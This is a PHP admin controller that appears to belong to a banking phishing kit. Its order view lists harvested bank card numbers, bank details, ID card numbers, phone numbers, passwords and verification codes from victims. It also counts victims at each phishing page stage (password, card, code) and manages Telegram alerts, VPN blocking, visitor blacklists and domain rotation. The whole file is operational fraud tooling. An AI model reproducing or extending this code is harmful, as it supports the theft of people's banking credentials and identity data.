<?php
namespace app\admin\controller;

use app\admin\controller\Base;
use think\Db;
use think\facade\Session;
use think\facade\Config;
class Index extends Base
{
    public $user;
    public function __construct()
    {
        parent::__construct();

        $this->user = new User();
    }
    
    public function addpopup()
    {
        if(Request()->ispost())
        {
            return $this->user->addpopup();
            
        }else{
            return $this->fetch('admin/addpopup');
        }
        
    }
    
    public function editpopup()
    {
        if(Request()->ispost())
        {
            return $this->user->editpopup();
            
        }else{
            $res = Db::name('popuplist')->where(['id' => $_GET['id']])->find();
            $this->assign('res',$res);
            return $this->fetch('admin/editpopup');
        }
    }
    
    public function popuplist()
    {
        $admin = Session::get('admin');
        $list = Db::name('popuplist')->order('id', 'desc')->paginate(10);

        $page = $list->render();
        
        $this->assign('list', $list);
        $this->assign('page', $page);
        return $this->fetch('admin/popuplist');
    }

    public function index()
    {
        $wid = Session::get('admin')['wid'];
        $sid = Db::name('website')->where(['id' => $wid])->value('sid');
        $title = Db::name('seller')->where(['id' => $sid])->field('title')->value('title');
        $this->assign('title', $title);
        return $this->fetch('admin/index');
    }

    public function main()
    {
        $this->webStatus();
        $content = Db::name('config')->where(['id' => 1])->value('content');
        $this->assign('content', $content);
        return $this->fetch('admin/main');
    }

    public function editmanage()
    {
        $id = Request()->get('id');
        $wid = Session::get('admin')['wid'];
        $res = Db::name('wadmin')->where(['wid' => $wid, 'id' => $id])->find();
        $this->assign('data', $res);
        return $this->fetch('admin/editmanage');
    }

    public function addmanage()
    {
        return $this->fetch('admin/addmanage');
    }

    public function manage()
    {
        $wid = Session::get('admin')['wid'];
        $data = Db::name('wadmin')->where(['wid' => $wid])->paginate(20);
        $page = $data->render();
        $this->assign('data', $data);
        $this->assign('page', $page);
        return $this->fetch('admin/manage');
    }

    public function order()
    {
        $admin = Session::get('admin');
        $vid = Db::name('web')->where(['id' => $admin['wid']])->value('vid');
        $field = Db::name('uview')->where('vid', $vid)->field('type,field')->find();
        $type = $field['type'];
        $field = unserialize($field['field']);
        $data = [];
        foreach ($field as $key => $value) {
            array_push($data, $value['name']);
        }
        
        $fie = ['codens','passns','bankcard','bankinfo','name','mobile','idcard','oid','vid','online','time','time','uptime','os','ip','ipaddress','agent','status','statusname'];
        array_unshift($data, 'id');
        $data = array_merge($data, $fie);

        //查找数据
        $where = [['wid', '=', $admin['wid']], ['vid' ,'=', $vid]];
        //判断是否查询
        $paramget = Request()->get();
        if(isset($paramget['card']))
        {
            array_push($where, ['bankcard', 'like', '%' . $paramget['card'] . '%']);
        }

        if(isset($paramget['name']))
        {
            array_push($where, ['name', 'like', '%' . $paramget['name']. '%']);
        }

        if(isset($paramget['online']))
        {
            array_push($where, ['online', '=', $paramget['online']]);
        }

        //var_dump($where);die;
        $list = Db::name('list')->where($where)->order('orderaes', 'desc')->order('uptime', 'desc')->field($data)->paginate(10);
        $page = $list->render();
        
        $speech = Db::name('uspeech')->where(['vid' => $vid])->order('sort')->select();
        $score = [
            'jin' => Db::name('list')
            ->where(['wid' => $admin['wid']])
            ->whereTime('time', 'today')
            ->count(),
            'zuo' => Db::name('list')
            ->where(['wid' => $admin['wid']])
            ->whereTime('time', 'yesterday')
            ->count(),
            'online' => Db::name('list')
            ->where(['wid' => $admin['wid'], 'online' => 1])
            ->count(),
            'visit' => Db::name('visitlog')
            ->where(['wid' => $admin['wid']])
            ->whereTime('time', 'today')
            ->count(),
            
            'index' => Db::name('pagelist')
            ->where(['page' => 'index'])
            ->count(),
            
            'pass' => Db::name('pagelist')
            ->where(['page' => 'pass'])
            ->count(),
            
            'card' => Db::name('pagelist')
            ->where(['page' => 'card'])
            ->count(),
            
            'name' => Db::name('pagelist')
            ->where(['page' => 'name'])
            ->count(),
            
            'loading' => Db::name('pagelist')
            ->where(['page' => 'loading'])
            ->count(),
            
            'code' => Db::name('pagelist')
            ->where(['page' => 'code'])
            ->count(),
        ];
        
        $this->assign('type', $type);
        $this->assign('score', $score);
        $this->assign('speech', $speech);
        $this->assign('list', $list);
        //var_dump($list);die;
        $this->assign('page', $page);
        $this->assign('field', field2Str($field));
        return $this->fetch('admin/order3');
    }

    public function editview()
    {
        if(Request()->ispost())
        {
            return $this->user->editview();
        }
        $id = Request()->get('id');
        $data = Db::name('uview')->where(['id' => $id])->find();
        $this->assign('config', json_decode($data['config'], true));
        $this->assign('data', $data);
        return $this->fetch('admin/editview');
    }

    public function conf()
    {
        $admin = Session::get('admin');
        $viewlist = Db::name('view')->field('id,name,type')->select();
        $vid = Db::name('web')->where(['id' => $admin['wid']])->value('vid');
        
        $this->assign('vid', $vid);
        $this->assign('viewlist', $viewlist);
        $param = json_decode(file_get_contents('./config.tt'), true);
        $this->assign('res', $param);
        return $this->fetch('admin/conf');
    }

    public function temp()
    {
        $admin = Session::get('admin');
        $list = Db::name('uview')->where(['wid' => $admin['wid']])->order('id', 'desc')->paginate(10);

        $page = $list->render();
        
        $this->assign('list', $list);
        $this->assign('page', $page);
        return $this->fetch('admin/temp');
    }

    public function editspeech()
    {
        if(Request()->ispost())
        {
            return $this->user->editspeech();
        }
        
        $page = Config::get('speech.');
        $view = Db::name('view')->field('id,name')->select();
        $speech = Db::name('uspeech')->where(['id' => Request()->get('id')])->find();
        $this->assign('speech', $speech);
        $this->assign('page', $page);
        $this->assign('view', $view);
        return $this->fetch('admin/editspeech');
    }

    public function addspeech()
    {
        if(Request()->ispost())
        {
            return $this->user->addspeech();
        }

        $page = Config::get('speech.');
        $view = Db::name('view')->field('id,name')->select();

        //var_dump($page, $view);die;
        $this->assign('page', $page);
        $this->assign('view', $view);
        return $this->fetch('admin/addspeech');
    }

    public function speech()
    {
        $admin = Session::get('admin');
        $where = ['wid' => $admin['wid']];
        if(!empty(Request()->get('id')))
        {
            $where['vid'] = Request()->get('id');
        }else{
            $where['vid'] = 0;
        }
        $where['vid'] = 14;
        $list = Db::name('uspeech')->where($where)->order('id', 'desc')->paginate(30);
        $page = $list->render();
        $vlist = Db::name('view')->field('id, name')->select();
        $this->assign('vlist', $vlist);
        //var_dump($list);die;
        $this->assign('list', $list);
        $this->assign('page', $page);
        return $this->fetch('admin/speech');
    }

    public function notice()
    {
        //$wid = Session::get('admin')['wid'];
        $content = Db::name('config')->where(['id' => 1])->value('content');
        $this->assign('content', $content);
        return $this->fetch('admin/notice');
    }

    public function domain()
    {
        $admin = Session::get('admin');

        $domain = Db::name('domainlog')->where(['wid' => $admin['wid']])->field('domain')->select();
        $web = Db::name('web')->where(['id' => $admin['wid']])->field('sendurl,domain,suffix')->find();
        $this->assign('domain', $domain);
        $this->assign('web', $web);
        return $this->fetch('admin/domain');
    }

    public function notify()
    {
        $admin = Session::get('admin');
        $web = Db::name('web')->where(['id' => $admin['wid']])->field('is_tg,tgid,is_vpn,key,region')->find();
        $this->assign('web', $web);
        return $this->fetch('admin/notify');
    }

    public function accesslog()
    {
        $admin = Session::get('admin');
        $list = Db::name('visitlog')->where(['wid' => $admin['wid'], 'status' => 1])->order('time', 'desc')->paginate(10);

        $page = $list->render();
        
        $this->assign('list', $list);
        $this->assign('page', $page);
        return $this->fetch('admin/accesslog');
    }

    public function blacklist()
    {
        $admin = Session::get('admin');
        $list = Db::name('visitlog')->where(['wid' => $admin['wid'], 'status' => 0])->order('time', 'desc')->paginate(10);

        $page = $list->render();
        
        $this->assign('list', $list);
        $this->assign('page', $page);
        return $this->fetch('admin/blacklist');
    }

    public function adminlog()
    {
        return $this->fetch('admin/adminlog');
    }

    public function visit()
    {
        return $this->fetch('admin/visit');
    }
}
